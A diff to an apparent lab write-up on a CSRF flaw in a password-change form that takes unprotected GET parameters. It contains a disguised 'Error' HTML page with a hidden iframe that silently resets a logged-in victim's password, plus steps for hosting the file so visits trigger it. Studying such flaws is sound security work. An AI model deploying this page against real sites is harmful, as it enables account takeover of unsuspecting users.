@@ -40,7 +40,8 @@
 3. Also observed if you have a look in the URL after changing the password the params are very easily editable to change pass
 4. Because there isn't a token in the GET request, we don't need to call a specific cookie/user token to choose what accounts password we are changing.
 5. Here's the HTML page
-<pre> ```<!DOCTYPE html>
+<pre> ```
+<!DOCTYPE html>
 <html>
   <head>
     <title>Error</title>
@@ -54,7 +55,8 @@
       style="display:none;">
     </iframe>
   </body>
-</html></pre> ```
+</html>
+</pre> ```
 6. Changes password to 'password123' for the user that is logged in. This only works if the user is logged into the website at the time.
 7. To test this work you can boot up burp for your browser and you will see the forward request come through when you load this malicious html file.
 8. You can also host a HTTP server on your host as well. Then if I visit (my-host-ip:port-assigned-to-http-server/malicious-html-filename.html it will commit the change.
